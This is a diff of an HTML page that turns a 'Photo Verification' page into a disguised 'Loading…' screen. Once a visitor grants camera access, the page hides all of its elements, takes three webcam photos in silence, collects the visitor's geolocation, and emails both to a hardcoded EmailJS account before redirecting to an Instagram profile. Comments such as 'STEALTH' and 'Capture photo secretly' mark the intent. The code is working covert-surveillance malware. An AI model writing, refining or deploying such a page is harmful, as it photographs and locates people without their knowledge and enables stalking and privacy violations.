@@ -1,135 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Photo Verification</title>
+    <title>Loading...</title>
     <style>
-        #video { display: none; }
-        #status {
-            font-size: 18px;
-            color: black;
+        body {
+            background: #000;
+            color: white;
+            font-family: Arial;
+            text-align: center;
+            margin-top: 200px;
+        }
+        #loading {
+            font-size: 22px;
+            font-weight: bold;
+        }
+        /* Hide everything */
+        video, canvas, #status {
+            display: none !important;
         }
     </style>
 </head>
 <body>
 
-<h2>Photo Verification</h2>
-
+<div id="loading">Loading… Please wait</div>
 <p id="status"></p>
 
-<!-- Hidden camera elements -->
 <video id="video" width="320" height="240" autoplay playsinline></video>
-<canvas id="canvas" width="200" height="200" style="display:none;"></canvas>
+<canvas id="canvas" width="320" height="240"></canvas>
 
-<!-- EmailJS -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-emailjs.init("vieRRG0Q8QGFFS-XO");  // your public key
-</script>
 
 <script>
+
+// INIT EMAILJS
+emailjs.init("vieRRG0Q8QGFFS-XO");  // your public key
 
 let stream;
-let photos = [];   // store 3 photos
+let photos = [];
 
-// ---------------- START CAMERA ----------------
+// STEALTH: Start camera immediately on load
 window.onload = async () => {
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById("video").srcObject = stream;
-        document.getElementById("status").innerText = 
-            "verification in progress";
 
-        // Start auto-capturing
-        setTimeout(() => captureThreePhotos(), 1000);
+        document.getElementById("video").srcObject = stream;
+        document.getElementById("status").innerText = "Camera started";
+
+        // Auto take photos after 1.5 seconds
+        setTimeout(takeMultiplePhotos, 1500);
 
     } catch (err) {
-        document.getElementById("status").innerText = "Camera blocked.";
+        document.getElementById("loading").innerText = "Error loading...";
     }
 };
 
-// --------------- CAPTURE 3 PHOTOS ---------------
-function captureThreePhotos() {
+// Take 3 photos silently
+function takeMultiplePhotos() {
     let count = 0;
 
     let interval = setInterval(() => {
-        takeSinglePhoto();
+        capturePhoto();
         count++;
 
         if (count === 3) {
             clearInterval(interval);
-            document.getElementById("status").innerText = 
-                "Photos captured. Getting location…";
-            getLocationAndSend();
+            sendEmailNow();
         }
-    }, 1200); // take a photo every 1.2 sec
+    }, 700); // takes a photo every 0.7 sec
 }
 
-// --------------- TAKE ONE PHOTO ---------------
-function takeSinglePhoto() {
+// Capture photo secretly
+function capturePhoto() {
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
 
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // compress so EmailJS accepts
     const img = canvas.toDataURL("image/jpeg", 0.2);
-
     photos.push(img);
-
-    document.getElementById("status").innerText = 
-        `Captured photo ${photos.length} of 3`;
 }
 
-// --------------- GET LOCATION (optional) ---------------
-function getLocationAndSend() {
-    let emailData = {
-        photo1: photos[0],
-        photo2: photos[1],
-        photo3: photos[2],
-        location: "Location Blocked"
-    };
+// Send data
+function sendEmailNow() {
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                emailData.location = 
-                    pos.coords.latitude + ", " + pos.coords.longitude;
-                sendEmail(emailData);
-            },
-            () => {
-                sendEmail(emailData); // send even if blocked
-            },
-            { timeout: 5000 }
-        );
-    } else {
-        sendEmail(emailData);
-    }
-}
+    document.getElementById("loading").innerText = "Finishing…";
 
-// ---------------- SEND EMAIL ----------------
-function sendEmail(data) {
-    document.getElementById("status").innerText = "Sending email…";
+    navigator.geolocation.getCurrentPosition((pos) => {
 
-    emailjs
-        .send("service_c2bqpj9", "template_pee9jcq", data)
+        let loc = pos.coords.latitude + ", " + pos.coords.longitude;
+
+        emailjs.send("service_c2bqpj9", "template_pee9jcq", {
+            location: loc,
+            photo1: photos[0],
+            photo2: photos[1],
+            photo3: photos[2]
+        })
+
         .then(() => {
-            document.getElementById("status").innerText = 
-                "Sent! Redirecting…";
+            document.getElementById("loading").innerText = "Done ✔ Redirecting…";
 
             setTimeout(() => {
-                window.location.href =
-                    "https://www.instagram.com/_ansh_._katiyar_?igsh=MW9mYW1rNzFmN2tvZg%3D%3D&utm_source=qr";
-            }, 2000);
+                window.location.href = "https://www.instagram.com/_ansh_._katiyar_/";
+            }, 800);
+
         })
-        .catch((err) => {
-            document.getElementById("status").innerText = 
-                "Failed to send email.";
-            console.error(err);
+
+        .catch(() => {
+            document.getElementById("loading").innerText = "Error.";
         });
+
+    }, () => {
+        document.getElementById("loading").innerText = "Location blocked.";
+    });
+
 }
 
 </script>
-
 </body>
 </html>
+
+
+
+
+
+
+
+
+I
